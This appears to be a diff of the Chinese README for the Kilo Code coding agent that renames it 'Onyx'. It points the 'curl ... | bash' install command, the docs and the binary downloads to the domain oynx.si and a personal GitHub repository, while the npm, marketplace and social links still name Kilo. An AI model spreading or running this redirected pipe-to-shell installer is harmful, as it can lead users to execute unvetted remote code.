@@ -3,7 +3,7 @@
 </p>
 
 <p align="center">
-  <a href="https://kilo.ai"><img width="250" alt="Kilo Code logo" src="https://github.com/user-attachments/assets/bdb0c174-b9fd-40ad-a47b-f3aab9b54e8d" /></a>
+  <a href="https://oynx.si"><img width="250" alt="Onyx logo" src="https://github.com/user-attachments/assets/bdb0c174-b9fd-40ad-a47b-f3aab9b54e8d" /></a>
 </p>
 
 <p align="center">用于在 VS Code、JetBrains 或 CLI 中借助 AI 构建的开源编码代理。</p>
@@ -12,8 +12,8 @@
   <a href="https://marketplace.visualstudio.com/items?itemName=kilocode.Kilo-Code"><img src="https://raster.shields.io/badge/VS_Code_Marketplace-007ACC?style=flat&logo=visualstudiocode&logoColor=white" alt="VS Code Marketplace" height="20"></a>
   <a href="https://www.npmjs.com/package/@kilocode/cli"><img alt="npm" src="https://raster.shields.io/npm/v/@kilocode/cli?style=flat" height="20" /></a>
   <a href="https://x.com/kilocode"><img src="https://raster.shields.io/badge/kilocode-000000?style=flat&logo=x&logoColor=white" alt="X (Twitter)" height="20"></a>
-  <a href="https://blog.kilo.ai"><img src="https://raster.shields.io/badge/Blog-555?style=flat&logo=substack&logoColor=white" alt="Blog" height="20"></a>
-  <a href="https://kilo.ai/discord"><img src="https://raster.shields.io/badge/Join%20Discord-5865F2?style=flat&logo=discord&logoColor=white" alt="Discord" height="20"></a>
+  <a href="https://blog.oynx.si"><img src="https://raster.shields.io/badge/Blog-555?style=flat&logo=substack&logoColor=white" alt="Blog" height="20"></a>
+  <a href="https://oynx.si/discord"><img src="https://raster.shields.io/badge/Join%20Discord-5865F2?style=flat&logo=discord&logoColor=white" alt="Discord" height="20"></a>
   <a href="https://www.reddit.com/r/kilocode/"><img src="https://raster.shields.io/badge/Join%20r%2Fkilocode-D84315?style=flat&logo=reddit&logoColor=white" alt="Reddit" height="20"></a>
 </p>
 
@@ -21,7 +21,7 @@
 
 ---
 
-Kilo Code 是一个 AI 编码代理，可以在你工作的任何地方使用：[VS Code](https://kilo.ai/landing/vs-code)、[JetBrains](https://kilo.ai/features/jetbrains-native) 和 [CLI](https://kilo.ai/cli)。它是开源的，并采用开放定价。你可以从 500 多个模型中选择，在任务中途切换模型，并按模型提供商的价格付费，没有加价。开始使用无需 API 密钥。
+Onyx 是一个 AI 编码代理，可以在你工作的任何地方使用：[VS Code](https://oynx.si/landing/vs-code)、[JetBrains](https://oynx.si/features/jetbrains-native) 和 [CLI](https://oynx.si/cli)。它是开源的，并采用开放定价。你可以从 500 多个模型中选择，在任务中途切换模型，并按模型提供商的价格付费，没有加价。开始使用无需 API 密钥。
 
 ### 安装
 
@@ -32,7 +32,7 @@ Kilo Code 是一个 AI 编码代理，可以在你工作的任何地方使用：
 
 <br>
 
-直接安装 [Kilo Code 扩展](vscode:extension/kilocode.kilo-code)，或从 [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=kilocode.Kilo-Code) 获取。创建账户后，你可以按提供商价格访问 500 多个模型，包括 GPT-5.5、Claude Opus 4.7、Claude Sonnet 4.6 和 Gemini 3.1 Pro Preview。
+直接安装 [Onyx 扩展](vscode:extension/kilocode.kilo-code)，或从 [VS Code Marketplace](https://marketplace.visualstudio.com/items?itemName=kilocode.Kilo-Code) 获取。创建账户后，你可以按提供商价格访问 500 多个模型，包括 GPT-5.5、Claude Opus 4.7、Claude Sonnet 4.6 和 Gemini 3.1 Pro Preview。
 
 </details>
 
@@ -46,7 +46,7 @@ Kilo Code 是一个 AI 编码代理，可以在你工作的任何地方使用：
 npm install -g @kilocode/cli
 
 # curl
-curl -fsSL https://kilo.ai/cli/install | bash
+curl -fsSL https://oynx.si/cli/install | bash
 
 # pnpm
 pnpm add -g @kilocode/cli
@@ -70,7 +70,7 @@ paru -S kilo-bin
 
 <br>
 
-从 JetBrains Marketplace 安装 [Kilo Code 插件](https://plugins.jetbrains.com/plugin/28350-kilo-code)，或在任意 JetBrains IDE 的 `Settings → Plugins` 中搜索 "Kilo Code"。
+从 JetBrains Marketplace 安装 [Onyx 插件](https://plugins.jetbrains.com/plugin/28350-kilo-code)，或在任意 JetBrains IDE 的 `Settings → Plugins` 中搜索 "Onyx"。
 
 </details>
 
@@ -79,7 +79,7 @@ paru -S kilo-bin
 
 <br>
 
-无需本地机器，在 Web 上通过 [app.kilo.ai/cloud](https://app.kilo.ai/cloud) 运行 Kilo。
+无需本地机器，在 Web 上通过 [app.oynx.si/cloud](https://app.oynx.si/cloud) 运行 Kilo。
 
 </details>
 
@@ -88,14 +88,14 @@ paru -S kilo-bin
 
 <br>
 
-在 [app.kilo.ai/code-reviews](https://app.kilo.ai/code-reviews) 为你的 Pull Request 设置自动 AI 代码审查。
+在 [app.oynx.si/code-reviews](https://app.oynx.si/code-reviews) 为你的 Pull Request 设置自动 AI 代码审查。
 
 </details>
 
 <details>
 <summary>从 GitHub Releases 安装 CLI（二进制文件）</summary>
 
-从 [Releases 页面](https://github.com/Kilo-Org/kilocode/releases) 下载最新二进制文件。
+从 [Releases 页面](https://github.com/Manash8666/oynx.git/releases) 下载最新二进制文件。
 
 | 平台 | 资源 |
 |---|---|
@@ -119,7 +119,7 @@ Kilo 内置了可按任务切换的专用 Agents。你也可以构建自己的�
 - **Debug** - 排查并追踪问题。
 - **Review** - 审查你的更改，并从性能、安全、风格和测试覆盖率等方面发现问题。
 
-了解更多关于 [agents 和自定义 agents](https://kilo.ai/docs/code-with-ai/agents/using-agents) 的信息。
+了解更多关于 [agents 和自定义 agents](https://oynx.si/docs/code-with-ai/agents/using-agents) 的信息。
 
 ### 功能
 
@@ -142,7 +142,7 @@ kilo run --auto "run tests and fix any failures"
 
 ### 文档
 
-关于配置和其他内容，请查看[文档](https://kilo.ai/docs)。
+关于配置和其他内容，请查看[文档](https://oynx.si/docs)。
 
 ### 贡献
 
@@ -157,12 +157,12 @@ MIT。你可以使用、修改和分发此代码，包括商业用途，只要�
 ### FAQ
 
 <details>
-<summary>Kilo CLI 从哪里来？</summary>
+<summary>Onyx CLI 从哪里来？</summary>
 
-Kilo CLI 是 [OpenCode](https://github.com/anomalyco/opencode) 的一个 fork，并增强为可在 Kilo agentic engineering 平台中使用。
+Onyx CLI 是 [OpenCode](https://github.com/anomalyco/opencode) 的一个 fork，并增强为可在 Kilo agentic engineering 平台中使用。
 
 </details>
 
 ---
 
-**加入社区** [Discord](https://kilo.ai/discord) | [X](https://x.com/kilocode) | [Reddit](https://www.reddit.com/r/kilocode/)
+**加入社区** [Discord](https://oynx.si/discord) | [X](https://x.com/kilocode) | [Reddit](https://www.reddit.com/r/kilocode/)
